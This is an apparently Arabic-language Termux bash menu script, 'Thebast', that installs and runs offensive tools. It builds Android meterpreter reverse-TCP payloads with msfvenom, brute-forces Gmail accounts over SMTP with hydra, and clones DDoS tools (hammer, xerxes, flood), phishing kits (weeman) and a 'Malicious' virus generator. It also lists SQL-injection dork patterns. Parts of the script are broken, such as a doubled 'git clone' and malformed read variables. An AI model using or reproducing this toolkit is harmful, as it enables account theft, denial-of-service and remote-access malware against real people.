#!/data/data/com.termux/files/usr/bin/bash 
clear
#colors
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
clear
date
for i in         s t a r t 
do
sleep 0.1
echo -e -ne "$green$i $red"
done 
clear
for i in        H E L O O  
do
sleep 0.1
echo -e -ne "$green$i $red"
done

echo -e "    
$red ============================================||
                                             ||
       $blue  ################# $red                  ||  $blue  ############### $red
      $blue   # by:-  Ahsan   # $red                  ||  $blue  # AHSAN ALSAEH# $red
      $blue   ################# $red       *          ||  $blue  ############### $red
$red                                             ||   
                                      _______||__     
                       $blue  * $red         /            \                $yellow * $red                   
       $green * $red                         | $green { 3 $yellow.$blue 0.$green 0}$red |  
                                   |,  .-.  .-.  ,|          $green  * $red
                             $yellow * $red   | )(_ /  \_ )( |
                                   |/     /\     \|    
                         (@_)      <__    ^^    __>         $green {3.0.0} $red
                    _     ) \_______\__|IIIIII|__/____________$blue by:-Ahsan Alsaeh$red _______________
                          (_)\e[______________________________/_____/_______/___>_/____/___ /__/_)_/
    $cyan * $red                   )_/         \ IIIIII /                    
                         (@)           --------                        
                                     
$green
                                         📱📷💻
   
                                      T$cyan H$purple E$red B$green A$blue S$yellow T$reset                     

$blue               |________________________________________________________|
                  
        
$green                                       
              ___________________________________________________________
              |  [$red 1 $green]nmap🌐                    |  [$red 29 $green]ngrok          |          
              |  [$red 2 $green]metaspilt📱               |  [$red 30 $green]Tool-X         |                
              |  [$red 3 $green]my ip📤                   |  [$red 31 $green]open port      |          
              |  [$red 4 $green]exit                      |  [$red 32 $green]EasY__HaCk     |      
              |  [$red 5 $green]install python🕵️‍♂️          |  [$red 33 $green]ﺲﻜﻣﺮﻴﺗ ﻲﻓ ﻢﻴﻠﻌﺗ|  
              |  [$red 6 $green]IP-locator                |  [$red 34 $green]ﺔﻴﺑﺮﻌﻟﺍ ﺔﻐﻟﺍ   |
              |  [$red 7 $green]payload android           |  [$red 35 $green]DarkFly        |
              |  [$red 8 $green]cupp                      |  [$red 36 $green]Tmux-Bunch     |
              |  [$red 9 $green]VIRS                      |  [$red 37 $green]vbug           |
              |  [$red 10 $green]Gmail                    |  [$red 38 $green]TermuxAlpine   |
              |  [$red 11 $green]FACEBOOK                 |  [$red 39 $green]Bull-Attack    |
              |  [$red 12 $green]payload Windos           |  [$red 40 $green]flood          |
              |  [$red 13 $green]Hydra-Project            |  [$red 41 $green]sqlmap         |
              |  [$red 14 $green]WOLF                     |  [$red 42 $green]xerxes         |
              |  [$red 15 $green]weeman                   |  [$red 43 $green]DDOS ATTACK    |
              |  [$red 16 $green]Malicious ﺱﺮﻳﺎﻓ          |  [$red 44 $green]Hunner         |
              |  [$red 17 $green]Lazymux                  |  [$red 45 $green]send call to   | 
              |  [$red 18 $green]network                  |  [$red 46 $green]ip network     | 
              |  [$red 19 $green]MODe Termux              |  [$red 47 $green]project Termux |
              |+++++++++++++++++++++++++++++++++++++++++++++++++++++++++|
              |       [$red 77 $green]$red Youtube $green    |       [$red 00 $green]$blue facebook $green       |
              |__________ _______________|______________________________|
                 $yellowﺪﻳﺪﺟ ﻞﻛ ﻚﻠﺼﻴﻟ ﻲﺗﺎﻨﻗ ﻊﺑﺎﺗ ﻡﺎﻳﺍ 5 ﺪﻌﺑ ﺓﺍﺩﻻﺍ ﺖﻳﺪﺤﺗ ﻢﺘﻴﺳ
                                    
$blue
"
sleep 0.1
echo -e "$red{======my$blue=======ip$green=========}"
       curl ifconfig.me
echo -e "$blue"
ifconfig wlan0 | grep -o 192..........
#echo -e "$green "
echo -e "{=====$blue======$green=======$red========}"

read -p  "number------>>"  u
if [ $u -eq 1  ]; then
clear
pkg install nmap 
cd .meta
bash np.sh
fi

if [ $u  -eq 2  ]; then
clear          
cd .meta
clear
echo "                                                                                                                         ";
echo "                                                                                                                 dddddddd";
echo "                                                           lllllll                                               d::::::d";
echo "                                                           l:::::l                                               d::::::d";
echo "                                                           l:::::l                                               d::::::d";
echo "                                                           l:::::l                                               d:::::d ";
echo "ppppp   ppppppppp     aaaaaaaaaaaaayyyyyyy           yyyyyyyl::::l    ooooooooooo     aaaaaaaaaaaaa      ddddddddd:::::d ";
echo "p::::ppp:::::::::p    a::::::::::::ay:::::y         y:::::y l::::l  oo:::::::::::oo   a::::::::::::a   dd::::::::::::::d ";
echo "p:::::::::::::::::p   aaaaaaaaa:::::ay:::::y       y:::::y  l::::l o:::::::::::::::o  aaaaaaaaa:::::a d::::::::::::::::d ";
echo "pp::::::ppppp::::::p           a::::a y:::::y     y:::::y   l::::l o:::::ooooo:::::o           a::::ad:::::::ddddd:::::d ";
echo " p:::::p     p:::::p    aaaaaaa:::::a  y:::::y   y:::::y    l::::l o::::o     o::::o    aaaaaaa:::::ad::::::d    d:::::d ";
echo " p:::::p     p:::::p  aa::::::::::::a   y:::::y y:::::y     l::::l o::::o     o::::o  aa::::::::::::ad:::::d     d:::::d ";
echo " p:::::p     p:::::p a::::aaaa::::::a    y:::::y:::::y      l::::l o::::o     o::::o a::::aaaa::::::ad:::::d     d:::::d ";
echo " p:::::p    p::::::pa::::a    a:::::a     y:::::::::y       l::::l o::::o     o::::oa::::a    a:::::ad:::::d     d:::::d ";
echo " p:::::ppppp:::::::pa::::a    a:::::a      y:::::::y       l::::::lo:::::ooooo:::::oa::::a    a:::::ad::::::ddddd::::::dd";
echo " p::::::::::::::::p a:::::aaaa::::::a       y:::::y        l::::::lo:::::::::::::::oa:::::aaaa::::::a d:::::::::::::::::d";
echo " p::::::::::::::pp   a::::::::::aa:::a     y:::::y         l::::::l oo:::::::::::oo  a::::::::::aa:::a d:::::::::ddd::::d";
echo " p::::::pppppppp      aaaaaaaaaa  aaaa    y:::::y          llllllll   ooooooooooo     aaaaaaaaaa  aaaa  ddddddddd   ddddd";
echo " p:::::p                                 y:::::y                                                                         ";
echo " p:::::p                                y:::::y                                                                          ";
echo "p:::::::p                              y:::::y                                                                           ";
echo "p:::::::p                             y:::::y                                                                            ";
echo "p:::::::p                            yyyyyyy                                                                             ";
echo "ppppppppp                                                                                                                ";
echo "                                                                                                                         ";





bash meta.sh
read -p "Entar------>>>"
cd ..
bash thebast.sh
fi
if [ $u -eq 3 ]; then
echo -e "$red{=======my$blue=========ip$green============}"
curl ifconfig.me
echo -e "$blue"
ifconfig wlan0 | grep -o 192..........
echo -e "{======$blue========$green==========$red=========}"
read -p "Entar----->"
bash thebast.sh 
fi
if [ $u  -eq 4 ]; then
#echo -e "$green "
figlet GOODBAY
echo "               *"
echo                 "      *   "
echo   "         *  "
echo  -e "BY:-$blue  Ahsan  $green Alsaeh $red"
clear
date
for i in  B Y : - A  h s a n  A l s a e h                      
do
sleep 0.1
echo -e  -ne "$green$i $red"
done
clear
date
for i in  B Y : - s o f i
do
sleep 0.2
echo -e  -ne "$green$i $red"
done

read -p "exit----->"
exit
exit
exit
fi
if [ $u  -eq 5  ]; then
pkg install python
pkg install python2
pkg install wget
pkg install git
pkg install nano 
fi
if [ $u  -eq 6  ]; then
clear
cd 
git clone https://github.com/th3sha10wbr04rs/Blue-Thunder-IP-Locator
echo -e  ٰ"$green=============================+"            
echo -e  "|                            |"
echo -e  "|   : ﺦﺴﻧﺍ ﺓﺍﺩﻻﺍ ﻞﻴﻐﺸﺗ ﻲﻟ    |"
echo -e  "|                            |"
echo -e  "|   $blue  cd payload5            |"
echo -e  "|     ./payload.sh           |"
echo -e  "|                            |"
echo -e  "|                            |"
echo -e  "|                            |"
echo -e  "|                            |"
echo -e  "|============================= "             
read -p "Entar------->>>"
bash thebast.sh
fi
if [ $u  -eq 45  ]; then
for i in 1 2 3 4 5 6 7 8 9 10
do
echo -e  -ne "$green$i"
sleep 0.2
done

clear
php 'ahsan.php '
read -p "Entar------>>>"
bash thebast.sh
fi
if [ $u -eq 9 ]; then
clear
cd Virs
bash vir.sh
read -p "Entar------>>>"
cd ..
bash thebast.sh
fi
if [ $u -eq 88 ]; then
clear
date
echo -e "$red===$blue====$green=>>AHSAN Alsaeh <<$red====$blue====$green====="
echo -e "$blue==$red=====$green=====>> ﺎﻴﺒﻴﻟ <<==$blue====$red====$green====="
read -p "Entar------>>>"
bash thebast.sh
fi
if [ $u -eq 00 ]; then

echo -e "$green                                _________-----_____         "
echo -e "                    _____------           __      ----_        "
echo -e "            ___----             ___------              \        "
echo -e "               ----________        ----   $blue facebook $green     \        "
echo -e "                           -----__    |             _____)        "
echo -e "                                __-                /$red#####$green\         "
echo -e "                    _______-----    ___--          \ $red####$green/)\         "
echo -e "              ------_______      ---____            \ $red##$green/ /        "
echo -e "                          -----__    \ --    _      --   /\       "
echo -e "                                 --__--__     \_____/   \_/\     "
echo -e "                                        --|--|   /          |    "
echo -e " ____ _            _               _         |  |___________|     "
echo -e "                                             |  | ((_(_)| )_)     "
echo -e "                                             |  \_((_(_)|/(_)     "
echo -e "                                             \             (      "
echo -e " $red _____             _ _              _        $green\_____________)     "
echo -e " $red|_   _| |__    __  | |__   ___  ___| |_                          "
echo -e " $red  | | | '_ \ / _ \ | '_ \ / _ \/ __| __|                         "
echo -e " $blue  | | | | | |  __/ | |_) |  __/\__ \ |_                         "
echo -e " $blue  |_| |_| |_|\___| |_.__/ \___||___/\__|$green                                           "




echo -e "$green    |++++++++++++++++++++++++++++ "          
echo "    |                           |"
echo -e "    |   $red ﺔﺤﻔﺼﻟﺍ ﻲﻟ ﻚﻳﻻ ﺎﺴﻨﺗﻻ    $green|"
echo -e "    |       $blue facebook $green          |"
echo     "    ============================="
read -p " ﺔﺤﻔﺼﻟﺍ ﻲﻟ ﺐﻫﺩﺍ------>>>"
termux-open  https://www.facebook.com/profile.php?id=100025128256916
bash thebast.sh
fi 
if [ $u -eq 13 ]; then 
clear
termux-open https://m.facebook.com/help/contact/209046679279097
fi
if [ $u -eq 11 ]; then
clear
cd .facebook
bash face.sh

read -p "Entar----->"
cd ..
bash thebast.sh
fi
if [ $u -eq 8 ]; then
git clone https://github.com/Mebus/cupp

read -p "Entar----->>"

cd cupp

chmod +x *

./cupp.py -i

echo "🌙 ☁☁☁☁"
echo " ▎ "
echo " █ ✨"
echo " █ ✨ 🌙 "
echo " █ ▎ "
echo " █ ◤ ████ ◥"
echo " █ ███ █ ███ ███████████████████"
echo " ██ █ █ █ █ █ █ █ █ █ ████"
echo " ███████████████████"
echo "ــــــــــــــــــــــــــــــ"
read -p "Entat===>>"
fi
if [ $u -eq 18 ]; then
clear
clear
pkg install w3m
clear
read -p " link ---->>" f
w3m $f
echo "

       ╱▔▔▔▔╲╭╭╮
    ╰╲╲▏▂╲╱▂▕╱╱╯
    ┈┈╲▏▇▏▕▇▕╱┈┈
    ┈┈╱╲▔▕▍▔╱╲┈┈
    ╭╱╱▕╋╋╋╋▏╲╲╮
     ╯╯┈╲▂▂╱┈╰╰╯
"
read -p "Entar----->"
bash thebast.sh
fi
if [ $u -eq 46 ]; then
clear
clear
echo -e "$red{=======my$blue=========ip$green============}"
curl  not net
echo -e "$blue"
netstat -a wlan0 | grep -o 192..........
echo -e "{======$blue========$green==========$red=========}"
read -p "Entar----->"
bash thebast.sh
fi
if [ $u -eq 19 ]; then 
clear 
git clone git clone https://github.com/Cabbagec/termux-ohmyzsh
cd termux-ohmyzsh
bash install.sh
read -p "Entar~~~~~~~~>>>"
bash thebast.sh
fi 
if [ $u -eq 24 ]; then
clear
termux-open http://getsub.top/
fi 
if [ $u -eq 12 ]; then
clear


echo "                                                                                                                         ";
echo "                                                                                                                 dddddddd";
echo "                                                           lllllll                                               d::::::d";
echo "                                                           l:::::l                                               d::::::d";
echo "                                                           l:::::l                                               d::::::d";
echo "                                                           l:::::l                                               d:::::d ";
echo "ppppp   ppppppppp     aaaaaaaaaaaaayyyyyyy           yyyyyyyl::::l    ooooooooooo     aaaaaaaaaaaaa      ddddddddd:::::d ";
echo "p::::ppp:::::::::p    a::::::::::::ay:::::y         y:::::y l::::l  oo:::::::::::oo   a::::::::::::a   dd::::::::::::::d ";
echo "p:::::::::::::::::p   aaaaaaaaa:::::ay:::::y       y:::::y  l::::l o:::::::::::::::o  aaaaaaaaa:::::a d::::::::::::::::d ";
echo "pp::::::ppppp::::::p           a::::a y:::::y     y:::::y   l::::l o:::::ooooo:::::o           a::::ad:::::::ddddd:::::d ";
echo " p:::::p     p:::::p    aaaaaaa:::::a  y:::::y   y:::::y    l::::l o::::o     o::::o    aaaaaaa:::::ad::::::d    d:::::d ";
echo " p:::::p     p:::::p  aa::::::::::::a   y:::::y y:::::y     l::::l o::::o     o::::o  aa::::::::::::ad:::::d     d:::::d ";
echo " p:::::p     p:::::p a::::aaaa::::::a    y:::::y:::::y      l::::l o::::o     o::::o a::::aaaa::::::ad:::::d     d:::::d ";
echo " p:::::p    p::::::pa::::a    a:::::a     y:::::::::y       l::::l o::::o     o::::oa::::a    a:::::ad:::::d     d:::::d ";
echo " p:::::ppppp:::::::pa::::a    a:::::a      y:::::::y       l::::::lo:::::ooooo:::::oa::::a    a:::::ad::::::ddddd::::::dd";
echo " p::::::::::::::::p a:::::aaaa::::::a       y:::::y        l::::::lo:::::::::::::::oa:::::aaaa::::::a d:::::::::::::::::d";
echo " p::::::::::::::pp   a::::::::::aa:::a     y:::::y         l::::::l oo:::::::::::oo  a::::::::::aa:::a d:::::::::ddd::::d";
echo " p::::::pppppppp      aaaaaaaaaa  aaaa    y:::::y          llllllll   ooooooooooo     aaaaaaaaaa  aaaa  ddddddddd   ddddd";
echo " p:::::p                                 y:::::y                                                                         ";
echo " p:::::p                                y:::::y                                                                          ";
echo "p:::::::p                              y:::::y                                                                           ";
echo "p:::::::p                             y:::::y                                                                            ";
echo "p:::::::p                            yyyyyyy                                                                             ";
echo "ppppppppp                                                                                                                ";
echo "                                                                                                                         ";




read -p "your host---->> " host
read -p "your port----->> " port
read -p "entar output----->> " output
msfvenom -p android/meterpreter/reverse_tcp LHOST=${host} LPORT=${port} -o ${output}
fi
if [ $u -eq 10 ]; then
clear
echo  "
$red
     ____                 _ _
    / ___|_ __ ___   __ _(_) |
   | |  _| '_ ` _ \ / _` | | |
   | |_| | | | | | | (_| | | |
    \____|_| |_| |_|\__,_|_|_|

"
read -p "Email =====>>" Email
read -p "listpassword =======>>" $listpassword
hydra -S -l Email=${Email} -P /sdcard/listpassword=${listpassword}-v -V -e ns -s 465 smtp.gmail.com smtp
read -p "Entar----->>>"
bash thebast.sh
fi
if [ $u -eq 29 ]; then
clear
echo ﺲﻜﻣﺮﻴﺗ ﻲﻟ ﻞﻘﻧﺍ ﻞﻳﺰﻨﺘﻟﺍ ﻢﺘﻳﺎﻣ ﺪﻌﺑ ngrok-stable-linux-arm.zip  ﻒﻠﻣ ﻝﺰﻧ ﻢﺗ ﻊﻗﻮﻤﻟﺍ تم ﻞﺠﺳﻭ ﺐﻫﺩﺍ ﻝﻭﺍ 
echo   ﻩﺪﻳﺮﻧ ﻱﺪﻟﺍ ﺕﺭﻮﺒﻟﺍ ﻊﻀﻧ ﻊﻀﻧ ﺎﻨﻫﻭ ﺎﻨﻟ ﺮﻬﻈﺗ ﺎﻫﺪﻌﺑ ﻒﻠﻤﻟﺍ ﻢﺳﺍ ﺎﻫﺪﻌﺑunzip ﻲﺑ ﻲﻠﻋ ﻂﻐﻀﻟﺍ ﻚﻓ ﺎﻫﺪﻌﺑ ﺲ
read -p ">>>>Entar<<<<<"
termux-open http://ngrok.com 
fi 
if [ $u -eq 30 ]; then 
clear
git clone https://github.com/Rajkumrdusad/Tool-X
cd Tool-X
chmod +x install.aex
sh install.aex
Tool-X

echo -e "$green|++++++++++++++++++++++++++++ "           
echo "|                           |"
echo "|     ﺦﺴﻧﺍ ﺓﺍﺩﻻﺍ ﻞﻴﻐﺸﺗ ﻲﻟ   |"
echo "|                           |"
echo "|          Tool-X           |"
echo "|                           |"
echo "|                           |"
echo "|                           |"
echo  -e "|  * * * * * * *         $green   |"
echo "|                           |"
echo "============================="
read -p "Entar-------->>>"
bash thebast.sh
fi 
if [ $u -eq 77 ]; then




echo -e "$green                                _________-----_____         "
echo -e "                    _____------           __      ----_        "
echo -e "            ___----             ___------              \        "
echo -e "               ----________        ----   $red Youtube $green     \        "
echo -e "                           -----__    |             _____)        "
echo -e "                                __-                /$red#####$green\         "
echo -e "                    _______-----    ___--          \ $red####$green/)\         "
echo -e "              ------_______      ---____            \ $red##$green/ /        "
echo -e "                          -----__    \ --    _      --   /\       "
echo -e "                                 --__--__     \_____/   \_/\     "
echo -e "                                        --|--|   /          |    "
echo -e " ____ _            _               _         |  |___________|     "
echo -e "                                             |  | ((_(_)| )_)     "
echo -e "                                             |  \_((_(_)|/(_)     "
echo -e "                                             \             (      "
echo -e " $red _____             _ _              _        $green\_____________)     "
echo -e " $red|_   _| |__    __  | |__   ___  ___| |_                          "
echo -e " $red  | | | '_ \ / _ \ | '_ \ / _ \/ __| __|                         "
echo -e " $red  | | | | | |  __/ | |_) |  __/\__ \ |_                         "
echo -e " $red  |_| |_| |_|\___| |_.__/ \___||___/\__|$green                                           "





echo -e "$green|+++++++++++++++++++++++++++++++++++++++++++++++++++++"           
echo -e "|$red ﻚﻳﻻ ﻲﺑ ﻲﻤﻋﺩﻭ ﺪﻳﺪﺟ ﻞﻛ ﻚﻠﺼﻴﻟ ﺓﺎﻨﻘﻟﺍ ﻲﻓ ﻙﺍﺮﺘﺷﻻﺍ ﺎﺴﻨﺗﻻ $green|"
echo -e "|                   $red Youtube $green                        |"
echo -e "|                                                    |"
echo -e "|                                                    |"
echo -e "|                                                    |"
echo -e "======================================================"
read -p " ﺮﺘﻧﺍ ﻂﻐﺿﺍ  ﺓﺎﻨﻘﻠﻟ ﺐﻫﺩﺍ------>>"
termux-open https://www.youtube.com/channel/UCI3o4rr8EJVes4drV_64SRQ
bash thebast.sh
fi 
if [ $u -eq 31 ]; then
clear
read -p  "port=======>>>" port  
cd $HOME 
./ngrok tcp ${port} 
fi
if [ $u -eq 34 ]; then
clear
echo " ﻡﺩﺎﻘﻟﺍ ﺖﻳﺪﺤﺘﻟﺍ ﻲﻓ ﺔﻴﺑﺮﻌﻟﺍ ﺔﻐﻟﺍ ﺔﻓﺎﺿﺍ ﻢﺘﻴﺳ " 
read -p "Entar------>>"
bash thebast.sh
fi 
if [ $u -eq 35 ]; then
clear 
git clone https://github.com/Ranginang67/DarkFly-Tool
DarkFly
echo -e  "$green++++++++++++++++++++++++++++|"
echo -e  "$green|$redﺦﺴﻧﺍ ﺍﺮﺧﺍ ﺓﺮﻣ ﺓﺍﺩﻻﺍ ﻞﻴﻐﺸﺗ ﻲ $green|"
echo -e  "$green|                           |"
echo -e  "$green|         DarkFly           |"
echo -e  "$green|                           |"
echo -e  "$green|                           |"
echo -e  "$green|                           |"
echo -e  "$green ============+================"
read -p "Entar=======>>"
bash thebast.sh
fi 
if [ $u -eq 44 ]; then 
clear
read -p "ip/link ==========>>>"  ${ip/link} 
read -p "port/80 ==========>>>"  ${port/80}
read -p "Time in seconds========>>>"  ${Time}
git clone https://github.com/cyweb/hammer.git
chmod +x *
python hummer.py -s ${ip/link} -p ${port/80} -t ${Time}
fi
if [ $u -eq 32 ]; then 
git clone https://github.com/sabri-zaki/EasY_HaCk
cd EasY_HaCk /
chmod +x install.sh
EasY-HaCk
read -p "Enter----->>"
echo ٰ"|++++++++++++++++++++++++++++ "          
echo "|                           |"
echo "|   ﺦﺴﻧﺍ ﺓﺍﺩﻻﺍ ﻞﻴﻐﺸﺗ ﻲﻟ     |"
echo "|                           |"
echo "|        EasY-HaCk          |"
echo "|                           |"
echo "|                           |"
echo "|                           |"
echo "|                           |"
echo "|                           |"
echo "============================="
echo  "──────────██───"
echo  "─────────█▒▒█──"
echo  "─────────█▒▒█──"
echo  "─────────█▒▒█──"
echo  "──────██▒█▒▒█──"
echo  "────██▒▒██▒▒█──"
echo  "──██▒▒█▒█████──"
echo  "─█▒▒█▒▒█▒▒▒▒▒█─"
echo  "█▒█▒▒█▒▒███▒▒▒█"
echo "─█▒█▒▒█▒▒█▒█▒▒█"
echo  "─█▒█▒▒███▒▒▒▒█─"
echo  "──█▒██▒▒▒▒▒▒█──"
echo  "───█▒▒▒▒▒▒▒█───"
echo  "────█▒▒▒▒▒▒█───"         
read -p "Entar-------->>"
bash thebast.sh
fi 
if [ $u -eq  33 ]; then 
echo " ﺪﻳﺪﺟ ﻞﻛ ﻚﻠﺼﻴﻟ ﻲﺗﺎﻨﻗ ﻊﺑﺎﺗ ﻡﺎﻳﺍ 5 ﺪﻌﺑ ﺓﺍﺩﻻﺍ  ﺖﻳﺪﺤﺗ ﺪﻨﻋ"
sleep 0.1
echo ٰ"            🌹🌹🌹"
echo "          🌹🌹🌹🌹 "
echo "         🌹🌹🌹🌹🌹"
echo "        🌹🌹🌹🌹🌹🌹"
echo "        🌹🌹🌹🌹🌹🌹"
echo "        🌹🌹🌹🌹🌹🌹"
echo "         🌹🌹🌹🌹🌹"
echo "          🌿🌹🌹🌿"
echo "              🌿🌿"
echo "              🌿                     🌿"
echo "              🌿               🌿🌿"
echo "              🌿           🌿🌿🌿"
echo "              🌿      🌿🌿🌿🌿"
echo "              🌿    🌿🌿🌿🌿"
echo "              🌿 🌿🌿🌿🌿"
echo "               🌿 🌿🌿🌿"
echo "                🌿"
echo "                🌿"
echo "                 🌿"
echo "                  🌿 "
read -p "Entar------>>>"
bash thebast.sh
fi
if [ $u -eq 36 ]; then

apt install axel
axel https://github.com/Hax4us/Tmux-Bunch/releases/download/v2.7/Tmux-Bunch-2.7.tar.gz
tar -xf Tmux-Bunch-2.7.tar.gz
cd Tmux-Bunch
bash setup
tmuxbunch
echo "+====================================+|"
echo "|                                     |"
echo "|      : ﺦﺴﻧﺍ ﺓﺍﺩﻻﺍ ﻞﻴﻐﺸﺗ ﻲﻟ          |"
echo "|                                     |"
echo "|            tmuxbunch                |"
echo "|                                     |"
echo "|                                     |"
echo "|					    |"
echo "|       				    |"
echo "|+====================================+"

echo  "──────────██───"
echo  "─────────█▒▒█──"
echo  "─────────█▒▒█──"
echo  "─────────█▒▒█──"
echo  "──────██▒█▒▒█──"
echo  "────██▒▒██▒▒█──"
echo  "──██▒▒█▒█████──"
echo  "─█▒▒█▒▒█▒▒▒▒▒█─"
echo  "█▒█▒▒█▒▒███▒▒▒█"
echo "─█▒█▒▒█▒▒█▒█▒▒█"
echo  "─█▒█▒▒███▒▒▒▒█─"
echo  "──█▒██▒▒▒▒▒▒█──"
echo  "───█▒▒▒▒▒▒▒█───"
echo  "────█▒▒▒▒▒▒█───"

read -p "Entar--------->>>"
bash thebast.sh
fi
if [ $u -eq 37 ]; then 
git clone https://github.com/Junior60/vbug
cd vbug
chmod +x *

echo ٰ"|++++++++++++++++++++++++++++"           
echo "|                           |"
echo "|   ﺦﺴﻧﺍ ﺓﺍﺩﻻﺍ ﻞﻴﻐﺸﺗ ﻲﻟ     |"
echo "|                           |"
echo "|        cd vbug            |"
echo "|     python2 vbug.py       |"
echo "|                           |"
echo "|                           |"
echo "|                           |"
echo "|                           |"
echo "============================="
python2 vbug.py         
read -p "Entar-------->>>>"
bash thebast.sh
fi
if [ $u -eq 7 ]; then

read -p "$red your host===>> " host
read -p " your port===>> " port
read -p "entar output====>> " output

msfvenom -p android/meterpreter/reverse_tcp LHOST=${host} LPORT=${port} -o ${output}
read -p "Enter--------->>>>"
bash thebast.sh
fi 
if [ $u -eq 38 ]; then 
git clone https://github.com/Hax4us/TermuxAlpine
cd TermuxAlpine
chmod +x *
bash TermuxAlpine.sh
read -p "Enter-------->>>"
bash thebast.sh
fi
if [ $u -eq 39 ]; then 
git clone https://github.com/Bhai4You/Bull-Attack
cd Bull-Attack
python2 B-attack.py
read -p "Entar------>>>"
bash thebast.sh
fi 
if [ $u -eq 40 ]; then
git clone https://github.com/jfurrow/flood
read -p "Entar------->>>"
fi
if [ $u -eq 41 ]; then
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
chmod +x sqlmap.py
echo "|===================================================================|"
echo "| .. ﻊﻗﻮﻤﻟﺍ ﺕﺎﻳﺎﻬﻧ ﻰﻟﺍ ﻱﺍ ﺕﺎﻛﺭﻭﺩ ﻰﻟﺍ ﻻﻭﺍ ﺝﺎﺘﺤﺗ ﺓﺍﺩﻻﺍ ﺢﺘﻔﺗ ﺎﻣﺪﻨﻋ     |"
echo "|              ﻊﻗﺍﻮﻤﻟﺍ ﻦﻣ ﻉﻮﻨﻟﺍ ﺍﺬﻫ ﻕﺮﺘﺨﺗ ﺎﻣﺪﻨﻋ ﻱﺍ                  |"
echo "| )kroD(ﺕﺎﻛﺭﻭﺩ ﻰﻤﺴﺗﻭ ﻲﻟﺎﺘﻟﺍ ﻞﻜﺸﻟﺍ ﻰﻠﻋ ﻪﺘﻳﺎﻬﻧ ﻥﻮﻜﺗ ﻥﺍ ﺐﺠﻳ            |"
echo "|===================-================================================"

echo ٰ"|++++++++++++++++++++++++++++++|"                                   
echo "-"
echo "page.php?id="
echo "-"
echo "trainers.php?id="
echo "-"
echo "article.php?ID="
echo "-"
echo "games.php?id="
echo "_"
echo "newsDetail.php?id="
echo "_"
echo "staff.php?id="
echo "_"
echo "products.php?id="
echo "_"
echo "news_view.php?id="
echo "_"
echo "opinions.php?id="
echo "_"
echo "pages.php?id="
echo "-"
echo "prod_detail.php?id="
echo "-"
echo "|============================|"
read -p "Entar------->>>"
bash thebast.sh
fi
if [ $u -eq 42 ]; then

echo -e  "$blue            .-.-.."
echo -e  "           /+/++//"
echo -e  "          /+/++//"
echo -e  "$green   *   * /+/++//"
echo -e  "    \ /  |/__//"
echo -e  "  {X}v{X}|///|$red==========.  "
echo -e  "    (')  /'|'\           \ "
echo -e  "        /  \  \          ' "
echo -e  "        \_  \_ \_   ___Thebast 2.0.0___ "


git clone https://github.com/zanyarjamal/xerxes
cd xerxes
chmod +x *

fi

if [ $u -eq 43 ]; then
git clone https://github.com/qw46478/start
cd start
echo -e $cyan""
echo "███████╗████████╗ █████╗ ██████╗ ████████╗"
echo "██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝"
echo "███████╗   ██║   ███████║██████╔╝   ██║   "
echo "╚════██║   ██║   ██╔══██║██╔══██╗   ██║   "
echo "███████║   ██║   ██║  ██║██║  ██║   ██║   "
echo "╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   "
echo "                                          "
echo  -e "$green  ____  ____   ___  ____       _  _____ _____  _    ____ _  __ "
echo  -e " |/ _ \|  _ \ / _ \/ ___|     / \|_   _|_   _|/ \  / ___| |/ / "
echo  -e "$red | | | | | | | | | \___ \    / _ \ | |   | | / _ \| |   | ' /  "
echo  -e " | |_| | |_| | |_| |___) |  / ___ \| |   | |/ ___ \ |___| . \  "
echo  -e " |____/|____/ \___/|____/  /_/   \_\_|   |_/_/   \_\____|_|\_\ " 

bash Ahsan.sh
read -p "Entar----->>>"
bash thebast.sh
bash thebast.sh
fi
if [ $u -eq 13 ]; then
git clone https://github.com/Hydraproject1/Hydra-Project-
cd Hydra-Project-
chmod +x install.sh
sh install.sh
read -p "Entar----->>>"
bash thebast.sh
fi
if [ $u = 14 ]; then
pkg install python3
pkg install nano
pip3 install requests bs4
pkg install git
git clone https://github.com/yehia-hacker/WOLF.git
chmod +x *
chmod +x WOLF.py
python3 WOLF.py
read -p "Enter------>>"
bash thebast.sh
fi 
if [ $u -eq 15 ]; then 
git clone https://github.com/evait-security/weeman
cd weeman
chmod 777 weeman.py
python2 weeman.py
read -p "Entar------->>"
cd ..
bash thebast.sh
fi
if [ $u -eq 16 ]; then
git clone https://github.com/Hider5/Malicious.git
cd Malicious
pip2 install -r requirements.txt
chmod 777 malicious.py
python2 malicious.py
read -p "Entar---->>"
cd ..
bash thebash.sh
fi
if [ $u -eq 17 ]; then 
git clone https://github.com/Gameye98/Lazymux.git
cd Lazymux
python2 lazymux.py 
read -p "Entar------>>"
cd ..
bash thebast.sh
fi
if [ $u -eq 47 ]; then
cp .bashrc $HOME
bash 
exit
fi
